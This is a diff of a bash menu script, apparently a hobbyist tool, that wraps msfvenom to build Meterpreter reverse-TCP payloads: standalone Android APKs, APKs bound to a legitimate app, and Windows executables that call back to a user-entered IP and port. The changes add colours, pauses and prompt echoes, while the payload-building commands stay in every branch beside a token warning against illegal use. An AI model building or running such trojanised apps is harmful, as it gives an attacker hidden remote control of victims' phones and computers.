@@ -1,59 +1,68 @@
-printf "\n\n\t\t\twritten by: Animesh Sinha\n\n\t\t\tgithub: animesh-h\n\n\n"
-echo -n "WARNING: THIS SCRIPT IS FOR KNOWLEDGE PURPOSE SO PLEASE DON'T USE IT ILLEGALY"
+printf "$(tput setaf 1)\n\n\t\t\tWritten By: Animesh Sinha\n\n\t\t\tGithub: animesh-h\n\n\n$(tput setab 7)"
+sleep 1
+echo -n "$(tput setaf 1)WARNING: THIS SCRIPT IS FOR KNOWLEDGE PURPOSE SO PLEASE DON'T USE IT ILLEGALY"
 count=0
 while [ $count -eq 0 ]
 do
-printf "\n\nEnter the type of os for which you want to create payload" 
-printf "\n\n1.android\n2.windows\n3.mac os\n"
+printf "$(tput setaf 1)\n\nEnter the type of os for which you want to create payload$(tput sgr 0)" 
+sleep 0.5
+printf "$(tput setaf 2)\n\n1.android\n2.windows\n3.mac os\n$(tput sgr 0)"
 read n
+printf "you entered option :- $n"
 case $n in
 1)
-printf "\n\t\t<<<<---:ANDROID PAYLOAD SECTION:--->>>>\n"
-printf "\n1.apk only\n2.binded apk(signed)\n3.persistence apk\n"
+printf "$(tput setaf 3)\n\t\t<<<<---:ANDROID PAYLOAD SECTION:--->>>>\n$(tput sgr 0)"
+sleep 0.5
+printf "$(tput setaf 1)\n1.apk only\n2.binded apk(signed)\n3.persistence apk\n$(tput sgr 0)"
 read x
+printf "you entered option :- $x"
 case $x in
 1)
-        echo -n "APK ONLY(NON-PERSISTENCE)"
-        echo -n "enter your ip: "
+        printf "\nAPK ONLY(NON-PERSISTENCE)\n"
+        sleep 0.5
+        printf "enter your ip: "
         read i_p
-        echo -n "enter port: "
+        printf "\nenter port: "
         read p
-        echo -n "enter name of apk: "
+        printf "\nenter name of apk: "
         read nm
         msfvenom -p android/meterpreter/reverse_tcp lhost="$i_p" lport="$p" R> $nm.apk
         ;;
 2)
-        echo -n "BINDED APK ONLY(NON-PERSISTENCE)"
-        echo -n "enter your ip: "
+        printf "\nBINDED APK ONLY(NON-PERSISTENCE)\n"
+        sleep 0.5
+        printf "\nenter your ip: "
         read i_p
-        echo -n "enter port: "
+        printf "\nenter port: "
         read p
-        echo -n "enter name of apk: "
+        printf "\nenter name of apk: "
         read nm
-        echo -n "attach original apk for binding: "
+        printf "\nattach original apk for binding: "
         read f
         msfvenom -p android/meterpreter/reverse_tcp lhost="$i_p" lport="$p" R> $nm.apk $f
         ;;
 3)
-        echo -n "PERSISTENCE BINDED APK"
-        echo -n "enter your ip: "
+        printf "\nPERSISTENCE BINDED APK\n"
+        sleep 0.5
+        printf "\nenter your ip: "
         read i_p
-        echo -n "enter port: "
+        printf "\nenter port: "
         read p
-        echo -n "enter name of apk: "
+        printf "\nenter name of apk: "
         read nm
-        echo -n "attach original apk for binding: "
+        printf "\nattach original apk for binding: "
         read f
         msfvenom -p android/meterpreter/reverse_tcp lhost="$i_p" lport="$p" R> $nm.apk $f
         ;;
         esac;;
 2)
         printf "\n\t\t<<<<---:WINDOWS PAYLOAD SECTION :--->>>>\n\n"
-        echo -n "enter your ip: "
+        sleep 0.5
+        printf "enter your ip: "
         read i_p
-        echo -n "enter port: "
+        printf "\nenter port: "
         read p
-        echo -n "enter name of exe: "
+        printf "\nenter name of exe: "
         read nm
         msfvenom -p windows/meterpreter/reverse_tcp lhost="$i_p" lport="$p" R> $nm.exe
         ;;
@@ -62,8 +71,10 @@ printf "\t\t\t<<<<<<< NOT YET READY >>>>>>>>\t\t\t\n"
 ;;
 *)
 printf "ENTERED WRONG OPTION"
+sleep 0.3
 printf "\n1.try again\n2.exit\n"
 read op
+printf "you entered option :- $op"
 case $op in
 1)
 count=0
